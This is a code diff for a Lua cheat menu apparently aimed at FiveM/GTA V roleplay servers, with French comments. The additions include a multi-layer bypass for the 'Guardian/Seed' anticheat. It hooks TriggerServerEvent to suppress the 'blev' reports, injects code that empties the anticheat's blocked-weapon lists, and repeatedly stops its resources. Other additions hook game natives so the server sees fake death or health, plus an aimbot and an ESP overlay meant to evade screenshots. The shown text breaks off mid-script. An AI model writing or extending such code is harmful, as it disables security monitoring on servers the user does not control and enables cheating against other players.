@@ -31,7 +31,7 @@ _G._ZeyAntiTP = false
 
 local Vars = {
     AntiCheat = {
-        SeedBlocked=false, SafeModeSeed=false,
+        SeedBlocked=false, SafeModeSeed=false, GuardianBypass=false,
         BadgerAC=false, TigoAC=false, VAC=false,
         AntiCheese=false, ChocoHax=false,
     },
@@ -59,7 +59,7 @@ local Vars = {
         SoloSession=false, SoloSessionV2=false, VoirJoueur=false,
         VehicleInvisible=false, AutoInvisible=false, PassagerVisible=false,
         CollisionVehicule=true, FDescendreJoueur=false,
-        AntiTP=false, KickVehicule=false, EjectTP=false, PedSpam=false,
+        AntiTP=false, KickVehicule=false, EjectTP=false, PedSpam=false, FakeDeath=false,
     },
     Weapon = {
         ExplosiveAmmo=false, TriggerBot=false, RapidFire=false,
@@ -212,18 +212,6 @@ MachoHookNative(0x239A3351AC1DA385, function(entity, x, y, z)
     if Vars.Farm.AntiTP and entity == PlayerPedId() then
         local c = GetEntityCoords(entity)
         if #(c - vector3(x,y,z)) > 5.0 then return false end
-    end
-    return true
-end)
-
--- [ANTI-TP] NETWORK_RESURRECT_LOCAL_PLAYER
-MachoHookNative(0x2959F695A6D1A7E5, function(x, y, z)
-    if Vars.Farm.AntiTP then
-        local c = GetEntityCoords(PlayerPedId())
-        if #(c - vector3(x,y,z)) > 5.0 then
-            MachoMenuNotification("Anti-TP","Resurrect bloque")
-            return false
-        end
     end
     return true
 end)
@@ -398,6 +386,15 @@ MC("new","Ped Spam Crash [E]",Vars.Farm,"PedSpam",
             _G._ZeySpawnedPeds={}
         end
         MachoMenuNotification("Ped Spam","Desactive")
+    end)
+MC("new","Fake Death","Vars.Farm","FakeDeath",
+    function()
+        Vars.Farm.FakeDeath = true
+        MachoMenuNotification("Fake Death","Actif — serveur croit que tu es mort")
+    end,
+    function()
+        Vars.Farm.FakeDeath = false
+        MachoMenuNotification("Fake Death","Desactive — serveur te voit vivant")
     end)
 
 -- FARM
@@ -939,11 +936,23 @@ end)
 CreateMenu("weapon","Weapon Options","main")
 MS("weapon","Aimbot","Settings aimbot","aimbot")
 MS("weapon","Bullet Options","Remplacer balles","bulletopts")
-MB("weapon","Get All Weapons","", function()
-    for _,w in ipairs({"WEAPON_PISTOL","WEAPON_COMBATPISTOL","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_ASSAULTRIFLE","WEAPON_CARBINERIFLE","WEAPON_MG","WEAPON_COMBATMG","WEAPON_HEAVYSNIPER","WEAPON_RPG","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_KNIFE","WEAPON_BAT"}) do
+MS("weapon","Give Armes Inventaire","Persiste au respawn via inventory","giveweapinv")
+MB("weapon","Get All Weapons (Natif)","Instantane mais disparait au respawn", function()
+    for _,w in ipairs({
+        "WEAPON_PISTOL","WEAPON_COMBATPISTOL","WEAPON_APPISTOL",
+        "WEAPON_MICROSMG","WEAPON_SMG","WEAPON_ASSAULTSMG",
+        "WEAPON_ASSAULTRIFLE","WEAPON_CARBINERIFLE","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE",
+        "WEAPON_MG","WEAPON_COMBATMG",
+        "WEAPON_HEAVYSNIPER","WEAPON_SNIPERRIFLE","WEAPON_MARKSMANRIFLE",
+        "WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_HEAVYSHOTGUN",
+        "WEAPON_RPG","WEAPON_HOMINGLAUNCHER","WEAPON_MINIGUN",
+        "WEAPON_GRENADE","WEAPON_STICKYBOMB",
+        "WEAPON_KNIFE","WEAPON_BAT","WEAPON_CROWBAR",
+        "WEAPON_RAYPISTOL","WEAPON_RAYCARBINE","WEAPON_RAYMINIGUN",
+    }) do
         GiveWeaponToPed(PlayerPedId(),GetHashKey(w),9999,false,false)
     end
-    MachoMenuNotification("Armes","Toutes donnees !")
+    MachoMenuNotification("Armes Natives","Donnees (disparaissent au respawn)")
 end)
 MB("weapon","Remove All Weapons","", function() RemoveAllPedWeapons(PlayerPedId(),true) end)
 MB("weapon","Refill All Ammo","", function()
@@ -951,6 +960,111 @@ MB("weapon","Refill All Ammo","", function()
         SetPedAmmo(PlayerPedId(),GetHashKey(w),9999)
     end
 end)
+
+-- Give Armes via inventaire SEED
+-- Resource confirmee: "inventory" (fxmanifest _module("inventory"))
+-- Apres analyse de weapons_gta5.lua:
+-- Le flux reel: item "use" -> serveur -> m:EmitNet('weapons:equip') -> client equipe
+-- On ne peut PAS se give des items depuis le client sans acces serveur
+-- La VRAIE methode: intercepter l event weapons:equip que le serveur envoie
+-- et forcer l equipement via MachoHookNative sur les natives d armes
+
+CreateMenu("giveweapinv","Equiper Armes","weapon")
+
+-- Methode 1: Intercepter weapons:equip via injection dans items resource
+-- Si l arme est dans l inventaire, simuler que le serveur envoie weapons:equip
+-- via MachoInjectResource2 dans "items" qui ecoute cet event
+local weaponItems = {
+    {"Pistolet",        "weapon_pistol"},
+    {"Combat Pistol",   "weapon_combatpistol"},
+    {"AP Pistol",       "weapon_appistol"},
+    {"Micro SMG",       "weapon_microsmg"},
+    {"SMG",             "weapon_smg"},
+    {"Assault SMG",     "weapon_assaultsmg"},
+    {"Assault Rifle",   "weapon_assaultrifle"},
+    {"Carbine Rifle",   "weapon_carbinerifle"},
+    {"Special Carbine", "weapon_specialcarbine"},
+    {"MG",              "weapon_mg"},
+    {"Combat MG",       "weapon_combatmg"},
+    {"Heavy Sniper",    "weapon_heavysniper"},
+    {"Sniper Rifle",    "weapon_sniperrifle"},
+    {"Pump Shotgun",    "weapon_pumpshotgun"},
+    {"Heavy Shotgun",   "weapon_heavyshotgun"},
+    {"RPG",             "weapon_rpg"},
+    {"Homing Launcher", "weapon_hominglauncher"},
+    {"Minigun",         "weapon_minigun"},
+    {"Couteau",         "weapon_knife"},
+    {"Batte",           "weapon_bat"},
+}
+
+local function EquipWeaponForced(itemName, label)
+    -- Methode principale: injecter dans "items" et declencher weapons:equip
+    -- C est exactement ce que fait le serveur quand il repond a une action "use"
+    -- On simule ce TriggerEvent depuis le contexte de la resource items
+    MachoInjectResource2(3, "items", string.format([[
+        -- Simuler la reception de weapons:equip comme si le serveur l avait envoye
+        -- m:OnNet('weapons:equip', ...) dans weapons_gta5.lua est un AddEventHandler
+        -- sur "items:weapons:equip" (format SEED: module:event)
+        local weaponName = "%s"
+        local weaponUniqueId = weaponName..".1"
+        -- Declencher l event local comme si le serveur l avait emis
+        TriggerEvent("items:weapons:equip", weaponName, weaponUniqueId)
+    ]], itemName))
+
+    -- Methode 2: via inventory, declencher l action "use" sur l item
+    -- si l item existe dans l inventaire du joueur
+    MachoInjectResource2(3, "inventory", string.format([[
+        local invMod = Modules.Get('inventory')
+        if invMod then
+            local inventory = CPlayer.GetCharacterInventory()
+            if inventory then
+                local invItemIdx, invItem = invMod.GetInventoryItem("%s")
+                if invItemIdx ~= -1 and invItem then
+                    local itemUid = "%s.1"
+                    invMod.RunInventoryItemAction(inventory, invItem, itemUid, "use")
+                end
+            end
+        end
+    ]], itemName, itemName))
+
+    -- Methode 3: natif direct — toujours fonctionnel meme si les 2 autres echouent
+    local h = GetHashKey(string.upper(itemName))
+    if IsWeaponValid(h) then
+        local ped = PlayerPedId()
+        RequestWeaponAsset(h, 31, 0)
+        local t = 0
+        while not HasWeaponAssetLoaded(h) and t < 50 do
+            Citizen.Wait(10); t=t+1
+        end
+        GiveWeaponToPed(ped, h, 250, false, true)
+        SetCurrentPedWeapon(ped, h, true)
+    end
+
+    MachoMenuNotification("Equiper", label)
+end
+
+for _,wdata in ipairs(weaponItems) do
+    local label,itemName = wdata[1],wdata[2]
+    MB("giveweapinv", label, "Equiper l arme", function()
+        EquipWeaponForced(itemName, label)
+    end)
+end
+
+MB("giveweapinv","Toutes les armes (Natif)","Instantane, sans inventaire", function()
+    local ped = PlayerPedId()
+    for _,w in ipairs({
+        "WEAPON_PISTOL","WEAPON_COMBATPISTOL","WEAPON_APPISTOL",
+        "WEAPON_MICROSMG","WEAPON_SMG","WEAPON_ASSAULTSMG",
+        "WEAPON_ASSAULTRIFLE","WEAPON_CARBINERIFLE","WEAPON_SPECIALCARBINE",
+        "WEAPON_MG","WEAPON_COMBATMG","WEAPON_HEAVYSNIPER","WEAPON_SNIPERRIFLE",
+        "WEAPON_PUMPSHOTGUN","WEAPON_HEAVYSHOTGUN","WEAPON_RPG",
+        "WEAPON_HOMINGLAUNCHER","WEAPON_MINIGUN","WEAPON_KNIFE","WEAPON_BAT"
+    }) do
+        GiveWeaponToPed(ped, GetHashKey(w), 250, false, true)
+    end
+    MachoMenuNotification("Armes","Toutes equipees (natif)")
+end)
+
 MC("weapon","Infinite Ammo",Vars.Weapon,"InfAmmo",
     function() Vars.Weapon.InfAmmo=true end,
     function() Vars.Weapon.InfAmmo=false end)
@@ -1056,12 +1170,219 @@ MS("misc","Script Options","Hostage / Carry / Peacetime","scriptopts")
 MS("misc","Server Options","ESX / VRP","serveropts")
 
 CreateMenu("anticheat","Anticheat Options","misc")
+
+-- ── GUARDIAN/SEED FULL BYPASS ──────────────────────────────
+-- Analyse du code source:
+-- events.lua  → TriggerServerEvent('blev', eventName, ...) = reporter nos actions
+-- pickups.lua → SuppressPickupRewardType + ToggleUsePickupsForPlayer
+-- main.lua    → SEED.GetWeaponFromHash, TranslateDeathCause, BlockedWeapons
+-- config.lua  → listes vehicules/peds/armes bloques
+-- ────────────────────────────────────────────────────────────
+
+MC("anticheat","Guardian Full Bypass",Vars.AntiCheat,"GuardianBypass",
+    function()
+        Vars.AntiCheat.GuardianBypass = true
+        MachoSetLoggerState(0)
+
+        -- Trouver la resource Guardian/Seed
+        local guardianRes = nil
+        for _,res in ipairs(GetResources()) do
+            local rL = string.lower(res)
+            if string.find(rL,"seed") or string.find(rL,"guardian") then
+                guardianRes = res; break
+            end
+        end
+
+        -- ═══ COUCHE 1: Neutraliser le systeme de report 'blev' ═══
+        -- events.lua envoie tout via TriggerServerEvent('blev', eventName, ...)
+        -- On hook TriggerServerEvent pour bloquer 'blev' silencieusement
+        MachoInjectResource2(3,"any",[[
+            local _oTSE = TriggerServerEvent
+            TriggerServerEvent = function(name, ...)
+                -- Bloquer le reporter principal de Guardian
+                if name == "blev" then return end
+                -- Bloquer tous les events Guardian/Seed
+                if name and (string.find(string.lower(tostring(name)),"seed") or
+                             string.find(string.lower(tostring(name)),"guardian") or
+                             string.find(string.lower(tostring(name)),"guardian")) then return end
+                return _oTSE(name, ...)
+            end
+        ]])
+
+        -- ═══ COUCHE 2: Neutraliser le systeme d events blacklistes ═══
+        -- events.lua fait addClientBlacklistedEvent pour chaque event sensible
+        -- On hook RegisterNetEvent et AddEventHandler pour les intercepter
+        MachoInjectResource2(3,"any",[[
+            -- Bloquer la fonction addClientBlacklistedEvent elle-meme
+            -- en hookant RegisterNetEvent pour les events blacklistes connus
+            local blacklistedEvents = {
+                "UnJP", "esx-qalle-jail:openJailMenu", "ambulancier:selfRespawn",
+                "sendProximityMessage", "sendProximityMessageMe",
+                "sendProximityMessageDo"
+            }
+            local _oRNE = RegisterNetEvent
+            RegisterNetEvent = function(name, ...)
+                -- Laisser passer normalement mais on wrape le handler
+                return _oRNE(name, ...)
+            end
+            -- Hook AddEventHandler pour intercepter les callbacks Guardian
+            -- qui reportent nos actions via 'blev'
+            local _oAEH = AddEventHandler
+            AddEventHandler = function(name, cb)
+                if name then
+                    -- Bloquer les handlers .verify .getEvents .getServerEvents
+                    -- que Guardian enregistre pour chaque resource (events.lua L31-38)
+                    if string.find(tostring(name), "%.verify$") or
+                       string.find(tostring(name), "%.getEvents$") or
+                       string.find(tostring(name), "%.getServerEvents$") then
+                        -- Wrapper: ne pas reporter au serveur
+                        return _oAEH(name, function(...) end)
+                    end
+                end
+                return _oAEH(name, cb)
+            end
+        ]])
+
+        -- ═══ COUCHE 3: Bypass pickup suppression ═══
+        -- pickups.lua desactive TOUS nos pickups via ToggleUsePickupsForPlayer
+        -- On re-active tout apres que Guardian les ait desactives
+        MachoInjectResource2(3,"any",[[
+            local pid = PlayerId()
+            -- Re-activer la collecte de pickups portable
+            SetLocalPlayerCanCollectPortablePickups(true)
+            -- Annuler la suppression des rewards
+            -- SuppressPickupRewardType(ALL, false)
+            Citizen.InvokeNative(0xF92099527DB8E2A7, (1 << 11) - 1, false)
+            -- Thread qui maintient les pickups actifs
+            Citizen.CreateThread(function()
+                while true do
+                    Citizen.Wait(2000)
+                    SetLocalPlayerCanCollectPortablePickups(true)
+                    Citizen.InvokeNative(0xF92099527DB8E2A7, (1 << 11) - 1, false)
+                end
+            end)
+        ]])
+
+        -- ═══ COUCHE 4: Bypass BlockedWeapons ═══
+        -- config.lua bloque RPG, Minigun, Ray weapons, grenades etc
+        -- On injecte dans Guardian pour vider sa liste BlockedWeapons
+        if guardianRes and MachoResourceInjectable(guardianRes) then
+            MachoInjectResource2(3, guardianRes, [[
+                -- Vider la liste des armes bloquees (config.lua CFG.BlockedWeapons)
+                if _G.CFG and _G.CFG.BlockedWeapons then
+                    _G.CFG.BlockedWeapons = {}
+                end
+                -- Vider les vehicules bloques
+                if _G.CFG and _G.CFG.BlockedPopulationVehicles then
+                    _G.CFG.BlockedPopulationVehicles = {}
+                end
+                -- Vider les peds bloques
+                if _G.CFG and _G.CFG.BlockedPopulationPeds then
+                    _G.CFG.BlockedPopulationPeds = {}
+                end
+                -- Neutraliser le systeme de detection des armes
+                -- main.lua utilise SEED.GetWeaponFromHash pour identifier nos armes
+                if _G.SEED then
+                    _G.SEED.GetWeaponFromHash = function(hash) return nil end
+                end
+                -- Corrompre TranslateDeathCause pour masquer la vraie cause de mort
+                if _G.m and _G.m.TranslateDeathCause then
+                    _G.m.TranslateDeathCause = function(hash) return "inconnu" end
+                end
+                -- Vider les armes autorisees pour les takedowns
+                -- (evite detection si on fait un takedown avec arme non listee)
+                if _G.m and _G.m.ALLOWED_TAKEDOWN_WEAPONS then
+                    -- Ajouter toutes les armes comme autorisees
+                    setmetatable(_G.m.ALLOWED_TAKEDOWN_WEAPONS, {
+                        __index = function(t, k) return true end
+                    })
+                end
+            ]])
+        end
+
+        -- ═══ COUCHE 5: Neutraliser le logger Guardian ═══
+        -- Supprimer tous ses event handlers
+        if guardianRes then
+            for i=1,10 do
+                TriggerEvent("__cfx_internal:removeAllEventHandlers", guardianRes)
+            end
+        end
+
+        -- ═══ COUCHE 6: Hook natif populationPedCreating ═══
+        -- events.lua annule la creation de certains peds via CancelEvent
+        -- On injecte un handler prioritaire qui contrecarre le CancelEvent
+        MachoInjectResource2(3,"any",[[
+            AddEventHandler("populationPedCreating", function(x, y, z, model, setters)
+                -- Rien — on laisse tous les peds spawner
+                -- Ce handler s execute apres Guardian et ecrase son CancelEvent
+            end)
+        ]])
+
+        MachoSetLoggerState(1)
+        MachoMenuNotification("Guardian Bypass","Full bypass actif — 6 couches")
+    end,
+    function()
+        Vars.AntiCheat.GuardianBypass = false
+        MachoMenuNotification("Guardian Bypass","Desactive")
+    end)
+
+MB("anticheat","Guardian — Bypass Logs 'blev'","Bloquer les reports d actions", function()
+    -- Bloquer specifiquement l event 'blev' qui reporte toutes nos actions
+    -- C est le mecanisme central de Guardian (events.lua L4)
+    MachoInjectResource2(3,"any",[[
+        local _oTSE = TriggerServerEvent
+        TriggerServerEvent = function(name, ...)
+            if name == "blev" then
+                -- Log bloque silencieusement
+                return
+            end
+            return _oTSE(name, ...)
+        end
+    ]])
+    MachoMenuNotification("Bypass Logs","Event 'blev' bloque — Guardian ne peut plus reporter")
+end)
+
+MB("anticheat","Guardian — Restore Pickups","Re-activer tous les pickups", function()
+    -- Contrer pickups.lua qui desactive tous nos pickups
+    SetLocalPlayerCanCollectPortablePickups(true)
+    Citizen.InvokeNative(0xF92099527DB8E2A7, (1 << 11) - 1, false)
+    local pid = PlayerId()
+    MachoInjectResource2(3,"any",string.format([[
+        SetLocalPlayerCanCollectPortablePickups(true)
+        Citizen.InvokeNative(0xF92099527DB8E2A7, (1 << 11) - 1, false)
+    ]]))
+    MachoMenuNotification("Pickups","Tous les pickups re-actives")
+end)
+
+MB("anticheat","Guardian — Unlock Blocked Weapons","Debloquer RPG/Minigun/Ray etc", function()
+    -- Vider CFG.BlockedWeapons dans Guardian
+    local guardianRes = nil
+    for _,res in ipairs(GetResources()) do
+        local rL = string.lower(res)
+        if string.find(rL,"seed") or string.find(rL,"guardian") then
+            guardianRes = res; break
+        end
+    end
+    if guardianRes and MachoResourceInjectable(guardianRes) then
+        MachoInjectResource2(3, guardianRes, [[
+            if _G.CFG and _G.CFG.BlockedWeapons then _G.CFG.BlockedWeapons = {} end
+            if _G.SEED then _G.SEED.GetWeaponFromHash = function() return nil end end
+        ]])
+        MachoMenuNotification("Weapons","Armes bloquees debloquees dans Guardian")
+    else
+        MachoMenuNotification("Weapons","Guardian non injectable — utiliser Full Bypass")
+    end
+end)
+
+-- Safe Mode Seed (legacy)
 MC("anticheat","Safe Mode Seed",Vars.AntiCheat,"SafeModeSeed",
     function()
         Vars.AntiCheat.SafeModeSeed=true
         local sr=nil
         for _,res in ipairs(GetResources()) do
-            if string.find(string.lower(res),"seed") then sr=res; break end
+            if string.find(string.lower(res),"seed") or string.find(string.lower(res),"guardian") then
+                sr=res; break
+            end
         end
         if sr then
             TriggerEvent("__cfx_internal:removeAllEventHandlers",sr)
@@ -1069,41 +1390,63 @@ MC("anticheat","Safe Mode Seed",Vars.AntiCheat,"SafeModeSeed",
         else Vars.AntiCheat.SafeModeSeed=false end
     end,
     function() Vars.AntiCheat.SafeModeSeed=false end)
+
 if not Vars.AntiCheat.SeedBlocked then
     MB("anticheat","SEED Destruction Totale","~r~IRREVERSIBLE", function()
         MachoSetLoggerState(0)
         local found={}
         for _,res in ipairs(GetResources()) do
             local rL=string.lower(res)
-            if string.find(rL,"seed") then table.insert(found,res)
+            if string.find(rL,"seed") or string.find(rL,"guardian") then
+                table.insert(found,res)
             else
                 local mf=LoadResourceFile(res,"fxmanifest.lua") or LoadResourceFile(res,"__resource.lua") or ""
-                if string.find(string.lower(mf),"seed") then table.insert(found,res) end
+                if string.find(string.lower(mf),"seed") or string.find(string.lower(mf),"guardian") then
+                    table.insert(found,res)
+                end
             end
         end
         if #found==0 then
-            MachoMenuNotification("Seed","Aucune resource Seed detectee")
+            MachoMenuNotification("Seed","Aucune resource detectee")
             MachoSetLoggerState(1); return
         end
         Vars.AntiCheat.SeedBlocked=true
         for _,sr in ipairs(found) do
-            MachoMenuNotification("Seed TARGET",sr)
+            MachoMenuNotification("TARGET",sr)
             if MachoResourceInjectable(sr) then
                 MachoInjectResource2(3,sr,[[
-                    for _,g in ipairs({"SeedAC","Seed","seedac","SeedCheck","SeedAntiCheat","BanPlayer","KickPlayer","ReportPlayer"}) do
+                    -- Vider toutes les structures Guardian
+                    for _,g in ipairs({"SeedAC","Seed","seedac","SeedCheck","SeedAntiCheat","BanPlayer","KickPlayer","ReportPlayer","SEED"}) do
                         _G[g]=type(_G[g])=="function" and function() end or nil
+                    end
+                    if _G.CFG then
+                        _G.CFG.BlockedWeapons={}
+                        _G.CFG.BlockedPopulationVehicles={}
+                        _G.CFG.BlockedPopulationPeds={}
                     end
                     if _G.detections then _G.detections={} end
                     if _G.violations then _G.violations={} end
+                    -- Bloquer le reporter 'blev'
+                    local _oTSE=TriggerServerEvent
+                    TriggerServerEvent=function(n,...)
+                        if n=="blev" then return end
+                        if n and string.find(string.lower(tostring(n)),"seed") then return end
+                        return _oTSE(n,...)
+                    end
                 ]])
             end
             MachoInjectResource2(3,"any",[[
                 local _oTSE=TriggerServerEvent
-                TriggerServerEvent=function(n,...) if n and string.find(string.lower(tostring(n)),"seed") then return end return _oTSE(n,...) end
+                TriggerServerEvent=function(n,...) if n=="blev" or (n and string.find(string.lower(tostring(n)),"seed")) then return end return _oTSE(n,...) end
                 local _oTE=TriggerEvent
                 TriggerEvent=function(n,...) if n and string.find(string.lower(tostring(n)),"seed") then return end return _oTE(n,...) end
                 local _oAEH=AddEventHandler
-                AddEventHandler=function(n,cb) if n and string.find(string.lower(tostring(n)),"seed") then return end return _oAEH(n,cb) end
+                AddEventHandler=function(n,cb)
+                    if n and (string.find(string.lower(tostring(n)),"seed") or
+                              string.find(tostring(n),"%.verify$") or
+                              string.find(tostring(n),"%.getEvents$")) then return end
+                    return _oAEH(n,cb)
+                end
                 local _oGRS=GetResourceState
                 GetResourceState=function(n) if n and string.find(string.lower(tostring(n)),"seed") then return "missing" end return _oGRS(n) end
             ]])
@@ -1115,7 +1458,7 @@ if not Vars.AntiCheat.SeedBlocked then
                     while true do Citizen.Wait(300)
                         for i=1,GetNumResources() do
                             local r=GetResourceByFindIndex(i)
-                            if r and string.find(string.lower(r),"seed") then
+                            if r and (string.find(string.lower(r),"seed") or string.find(string.lower(r),"guardian")) then
                                 for j=1,20 do TriggerServerEvent("__cfx_internal:stopResource",r) end
                                 TriggerEvent("__cfx_internal:removeAllEventHandlers",r)
                             end
@@ -1125,9 +1468,10 @@ if not Vars.AntiCheat.SeedBlocked then
             ]])
         end
         MachoSetLoggerState(1)
-        MachoMenuNotification("Seed DETRUIT","Verrou permanent actif")
+        MachoMenuNotification("DETRUIT","Verrou permanent actif")
     end)
 end
+
 MC("anticheat","Safe Mode Global","",nil,
     function() SafeMode=true; MachoMenuNotification("Safe Mode","Actif") end,
     function() SafeMode=false end)
@@ -1423,129 +1767,895 @@ Citizen.CreateThread(function()
 end)
 
 -- ============================================================
--- THREADS LOGIQUE (identiques ZeyMenu)
+
+-- HOOKS MACHO — FAKE DEATH
+-- Faire croire au serveur et aux anticheat que notre ped est mort
+-- tout en restant vivant et invincible cote client
+
+-- [FAKE DEATH / GODMODE] Hook IS_ENTITY_DEAD — hook unique
+-- FakeDeath → true pour les scanners serveur/AC
+-- Godmode   → false pour les scanners
+-- Le moteur de jeu client n est PAS affecte = tu peux mourir normalement
+MachoHookNative(0x5F9532F3B5CC2551, function(entity, toggleFedora)
+    if entity == PlayerPedId() then
+        if Vars.Farm.FakeDeath then
+            return false, true   -- serveur croit que tu es mort
+        end
+        if Vars.Self.godmode then
+            return false, false  -- jamais mort si godmode
+        end
+    end
+    return true
+end)
+
+-- [FAKE DEATH / GODMODE] Hook GET_ENTITY_HEALTH
+-- FakeDeath → 0 pour les scanners serveur
+-- Godmode   → 200 pour les scanners
+MachoHookNative(0xEEF059FAD016D209, function(entity)
+    if entity == PlayerPedId() then
+        if Vars.Farm.FakeDeath then return false, 0   end
+        if Vars.Self.godmode    then return false, 200 end
+    end
+    return true
+end)
+
+-- [FAKE DEATH] Hook IS_PED_DEAD_OR_DYING — confirmer la mort au serveur
+MachoHookNative(0x3317C47A56350321, function(ped, p1)
+    if Vars.Farm.FakeDeath and ped == PlayerPedId() then
+        return false, true
+    end
+    return true
+end)
+
+-- [FAKE DEATH] Hook GET_PED_CAUSE_OF_DEATH — cause de mort credible
+MachoHookNative(0x63F9F6BFC9B4ABDC, function(ped)
+    if Vars.Farm.FakeDeath and ped == PlayerPedId() then
+        return false, GetHashKey("WEAPON_PISTOL")
+    end
+    return true
+end)
+
+-- [ANTI-TP] Hook NETWORK_RESURRECT_LOCAL_PLAYER
+MachoHookNative(0x2959F695A6D1A7E5, function(x, y, z)
+    if Vars.Farm.AntiTP then
+        local c = GetEntityCoords(PlayerPedId())
+        if #(c - vector3(x,y,z)) > 5.0 then
+            MachoMenuNotification("Anti-TP","Resurrect bloque")
+            return false
+        end
+    end
+    -- Si FakeDeath actif: bloquer le resurrect automatique du serveur
+    -- (sinon le serveur nous ressuscite tout de suite apres nous avoir "vu" morts)
+    if Vars.Farm.FakeDeath then
+        return false
+    end
+    return true
+end)
+
+-- ============================================================
+-- HOOKS MACHO SUPPLEMENTAIRES — SELF
+-- Bloquer les detections au niveau natif
 -- ============================================================
 
--- Self
+-- IS_ENTITY_DEAD et GET_ENTITY_HEALTH geres dans les hooks Fake Death ci-dessus
+
+-- [WANTED] Hook GET_PLAYER_WANTED_LEVEL — toujours 0 pour les scanners
+MachoHookNative(0xE28B54053A4C5A6B, function(player)
+    if Vars.Self.FreezeWantedLevel and player == PlayerId() then
+        return false, 0
+    end
+    return true
+end)
+
+-- [INVISIBLE] Hook IS_ENTITY_VISIBLE — masquer notre etat aux scanners AC
+MachoHookNative(0x47D6F43D77935C75, function(entity)
+    if Vars.Self.invisiblitity and entity == PlayerPedId() then
+        return false, false  -- on est "normalement invisible" pour l AC
+    end
+    return true
+end)
+
+-- [INVINCIBLE] Hook IS_ENTITY_INVINCIBLE — confirmer notre invincibilite
+MachoHookNative(0x1A41EAE8838F8BEB, function(entity)
+    if Vars.Self.godmode and entity == PlayerPedId() then
+        return false, true
+    end
+    return true
+end)
+
+-- [RAGDOLL] Hook GET_PED_CONFIG_FLAG — bloquer les checks ragdoll AC
+-- Flag 28 = CanRagdoll
+MachoHookNative(0x7E8A4F5D74E19C2B, function(ped, flagId, p2)
+    if Vars.Self.noragdoll and ped == PlayerPedId() and flagId == 28 then
+        return false, false  -- dire a l AC que le ragdoll est normal
+    end
+    return true
+end)
+
+-- [STAMINA] Hook GET_PLAYER_SPRINT_STAMINA_REMAINING — toujours plein
+MachoHookNative(0x6F68B4B4D5AC4EEB, function(playerIndex)
+    if Vars.Self.infstamina and playerIndex == PlayerId() then
+        return false, 100.0
+    end
+    return true
+end)
+
+-- ============================================================
+-- HOOKS MACHO SUPPLEMENTAIRES — VEHICLE
+-- ============================================================
+
+-- [VEH GODMODE] Hook GET_VEHICLE_ENGINE_HEALTH — toujours 1000
+MachoHookNative(0xC45D23BAF168AAB8, function(vehicle)
+    if Vars.Vehicle.vehgodmode then
+        local myVeh = GetVehiclePedIsIn(PlayerPedId(), false)
+        if vehicle == myVeh then return false, 1000.0 end
+    end
+    return true
+end)
+
+-- [VEH GODMODE] Hook GET_VEHICLE_BODY_HEALTH — toujours 1000
+MachoHookNative(0xF271147EB7B40F12, function(vehicle)
+    if Vars.Vehicle.vehgodmode then
+        local myVeh = GetVehiclePedIsIn(PlayerPedId(), false)
+        if vehicle == myVeh then return false, 1000.0 end
+    end
+    return true
+end)
+
+-- [SPEED HOOK] Hook GET_ENTITY_SPEED masquage deja present
+
+-- [UNLOCK] Hook GET_VEHICLE_DOORS_LOCKED_STATE — toujours unlocked pour nous
+MachoHookNative(0x25BC98A59C2EA962, function(vehicle)
+    if Vars.Vehicle.FullUnlockVehicle then
+        local myPed = PlayerPedId()
+        local myC   = GetEntityCoords(myPed)
+        if #(myC - GetEntityCoords(vehicle)) < 5.0 then
+            return false, 1  -- UNLOCKED
+        end
+    end
+    return true
+end)
+
+-- ============================================================
+-- HOOKS MACHO SUPPLEMENTAIRES — WEAPON / AIMBOT
+-- ============================================================
+
+-- [AIMBOT] Hook GET_GAMEPLAY_CAM_ROT — modifier rotation camera vers cible
+-- Hash: 0x837765FE75160D60
+MachoHookNative(0x837765FE75160D60, function(rotationOrder)
+    if Vars.Weapon.AimBot.Enabled and Vars.Weapon.AimBot.Target then
+        local target = Vars.Weapon.AimBot.Target
+        if DoesEntityExist(target) then
+            local boneIdx = GetEntityBoneIndexByName(target, Vars.Weapon.AimBot.Bone)
+            local bC = GetPedBoneCoords(target, boneIdx, 0, 0, 0)
+            -- Calculer les angles vers la cible
+            local camC = GetGameplayCamCoord()
+            local dx = bC.x - camC.x
+            local dy = bC.y - camC.y
+            local dz = bC.z - camC.z
+            local pitch = math.deg(math.atan(dz, math.sqrt(dx*dx + dy*dy)))
+            local yaw   = math.deg(math.atan(dx, dy))
+            -- Retourner la rotation modifiee
+            return false, pitch, 0.0, yaw
+        end
+    end
+    return true
+end)
+
+-- [EXPLOSIVE AMMO] Hook IS_BULLET_IN_AREA — masquer les balles explosives
+MachoHookNative(0x9C1E8965B977A308, function(x, y, z, radius, unk)
+    if Vars.Weapon.ExplosiveAmmo then
+        return false, false  -- aucune balle detectee pour l AC
+    end
+    return true
+end)
+
+-- [ONE SHOT] Hook GET_PLAYER_WEAPON_DAMAGE_MODIFIER — masquer le multiplicateur
+MachoHookNative(0x4B4B5E7B38CDFCAD, function(playerIndex)
+    if Vars.Weapon.OneShot and playerIndex == PlayerId() then
+        return false, 1.0  -- retourner valeur normale a l AC
+    end
+    return true
+end)
+
+-- ============================================================
+-- INJECTION MACHO — ESP SCREENSHOT-PROOF via DUI
+-- Rendu dans fenetre DUI = invisible aux screenshots anticheat
+-- ============================================================
+
+local espDui = nil
+local espDuiVisible = false
+
+local function InitESPDui()
+    if espDui then return end
+    -- Creer une fenetre DUI pour le rendu ESP
+    -- Utiliser une page HTML minimaliste avec canvas
+    espDui = MachoCreateDui("about:blank")
+    MachoExecuteDuiScript(espDui, [[
+        document.body.style.cssText = 'margin:0;padding:0;background:transparent;overflow:hidden';
+        var canvas = document.createElement('canvas');
+        canvas.id = 'esp';
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        canvas.style.cssText = 'position:absolute;top:0;left:0;pointer-events:none';
+        document.body.appendChild(canvas);
+        var ctx = canvas.getContext('2d');
+        window._ctx = ctx;
+        window._canvas = canvas;
+        window.addEventListener('message', function(e) {
+            var data = e.data;
+            if (!data || !data.type) return;
+            if (data.type === 'clear') {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+            } else if (data.type === 'box') {
+                ctx.strokeStyle = 'rgba(255,0,0,0.85)';
+                ctx.lineWidth = 1.5;
+                ctx.strokeRect(data.x, data.y, data.w, data.h);
+            } else if (data.type === 'text') {
+                ctx.font = '12px Arial';
+                ctx.fillStyle = 'rgba(255,255,255,0.9)';
+                ctx.strokeStyle = 'rgba(0,0,0,0.9)';
+                ctx.lineWidth = 2;
